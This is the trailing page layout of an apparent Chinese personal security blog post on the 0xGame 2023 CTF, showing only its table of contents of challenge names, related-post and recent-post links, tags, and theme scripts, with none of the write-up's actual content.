未来可期！</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://hybcx.xyz/2023/10/22/0xgame-2023/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://hybcx.xyz/2023/10/22/0xgame-2023/')">0xGame 2023</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://hybcx.xyz/2023/10/22/0xgame-2023/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=0xGame 2023&amp;url=http://hybcx.xyz/2023/10/22/0xgame-2023/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://hybcx.xyz" target="_blank">hybcx</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/CTF%E8%B5%9B%E4%BA%8B/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>CTF赛事<span class="tagsPageCount">18</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/10/16/php-wu-can-shu-rce/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">php无参数RCE</div></div></a></div><div class="next-post pull-right"><a href="/2023/10/26/qian-xi-er-ci-xuan-ran/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">深度学习文件上传-二次渲染</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2023/10/02/2023shctf/" title="SHCTF 2023-wp"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-10-02</div><div class="title">SHCTF 2023-wp</div></div></a></div><div><a href="/2024/05/21/ciscn-2024wp/" title="CISCN-2024Wp"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-05-21</div><div class="title">CISCN-2024Wp</div></div></a></div><div><a href="/2023/12/12/ctfhub-xi-lie/" title="CTFHub系列"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-12-12</div><div class="title">CTFHub系列</div></div></a></div><div><a href="/2024/07/14/ctf-shua-ti/" title="CTF刷题"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-07-14</div><div class="title">CTF刷题</div></div></a></div><div><a href="/2024/03/17/fsctf-2023/" title="FSCTF 2023"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-03-17</div><div class="title">FSCTF 2023</div></div></a></div><div><a href="/2024/03/26/gdouctf-2023/" title="GDOUCTF2023"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-03-26</div><div class="title">GDOUCTF2023</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">产品、设计、开发</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/about"><h1 class="author-info__name">hybcx</h1><div class="author-info__desc">只需热爱, 未来可期！</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hybchenxing" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/1761635300" target="_blank" title="Email"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x01 前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#week-1-signin"><span class="toc-number">1.1.</span> <span class="toc-text">[Week 1] signin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week-1-baby_php"><span class="toc-number">1.2.</span> <span class="toc-text">[Week 1] baby_php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week-1-hello_http"><span class="toc-number">1.3.</span> <span class="toc-text">[Week 1] hello_http</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week-1-repo_leak"><span class="toc-number">1.4.</span> <span class="toc-text">[Week 1] repo_leak</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week-1-ping"><span class="toc-number">1.5.</span> <span class="toc-text">[Week 1] ping</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week-2-ez_sqli"><span class="toc-number">1.6.</span> <span class="toc-text">[Week 2] ez_sqli</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week-2-ez_upload"><span class="toc-number">1.7.</span> <span class="toc-text">[Week 2] ez_upload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week-2-ez_unserialize"><span class="toc-number">1.8.</span> <span class="toc-text">[Week 2] ez_unserialize</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week-2-ez_sandbox"><span class="toc-number">1.9.</span> <span class="toc-text">[Week 2] ez_sandbox</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week-3-notebook"><span class="toc-number">1.10.</span> <span class="toc-text">[Week 3] notebook</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week-3-rss_parser"><span class="toc-number">1.11.</span> <span class="toc-text">[Week 3] rss_parser</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week-3-zip_file_manager"><span class="toc-number">1.12.</span> <span class="toc-text">[Week 3] zip_file_manager</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-number">1.12.1.</span> <span class="toc-text">方法一：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-number">1.12.2.</span> <span class="toc-text">方法二：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week-3-web_snapshot"><span class="toc-number">1.13.</span> <span class="toc-text">[Week 3] web_snapshot</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week-3-goshop"><span class="toc-number">1.14.</span> <span class="toc-text">[Week 3] GoShop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week-4-spring"><span class="toc-number">1.15.</span> <span class="toc-text">[Week 4] spring</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#env-%E6%B3%84%E9%9C%B2%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF"><span class="toc-number">1.15.1.</span> <span class="toc-text">env 泄露配置信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mappings-%E6%B3%84%E9%9C%B2%E8%B7%AF%E7%94%B1%E4%BF%A1%E6%81%AF"><span class="toc-number">1.15.2.</span> <span class="toc-text">mappings 泄露路由信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#heapdump-%E6%B3%84%E9%9C%B2%E5%A0%86%E6%A0%88%E4%BF%A1%E6%81%AF"><span class="toc-number">1.15.3.</span> <span class="toc-text">heapdump 泄露堆栈信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week-4-auth_bypass"><span class="toc-number">1.16.</span> <span class="toc-text">[Week 4] auth_bypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week-4-yourbatis"><span class="toc-number">1.17.</span> <span class="toc-text">[Week 4] YourBatis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week-4-testconnection"><span class="toc-number">1.18.</span> <span class="toc-text">[Week 4] TestConnection</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E5%90%8E%E8%AE%B0"><span class="toc-number">2.</span> <span class="toc-text">0x02 后记</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">3.</span> <span class="toc-text">0x03 参考文章</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-sha-he-gui-bi/" title="THM-沙盒规避">THM-沙盒规避</a><time datetime="2024-08-21T09:41:49.000Z" title="发表于 2024-08-21 17:41:49">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-fang-huo-qiang/" title="THM-防火墙">THM-防火墙</a><time datetime="2024-08-21T07:07:33.000Z" title="发表于 2024-08-21 15:07:33">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-wang-luo-an-quan-jie-jue-fang-an/" title="THM-网络安全解决方案">THM-网络安全解决方案</a><time datetime="2024-08-21T01:37:19.000Z" title="发表于 2024-08-21 09:37:19">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-kao-tu-di-wei-sheng/" title="THM-靠土地为生">THM-靠土地为生</a><time datetime="2024-08-20T10:08:09.000Z" title="发表于 2024-08-20 18:08:09">2024-08-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-tao-bi-ri-zhi-ji-lu-he-jian-kong/" title="THM-逃避日志记录和监控">THM-逃避日志记录和监控</a><time datetime="2024-08-20T06:51:56.000Z" title="发表于 2024-08-20 14:51:56">2024-08-20</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="hybcx" target="_blank">hybcx</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">204</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">30</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 0.88rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 0.88rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 0.88rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 0.88rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 0.88rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 0.88rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 0.88rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 0.88rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 0.88rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 0.88rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 0.88rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 0.88rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="is-center" id="loading-database"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-pulse-icon"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
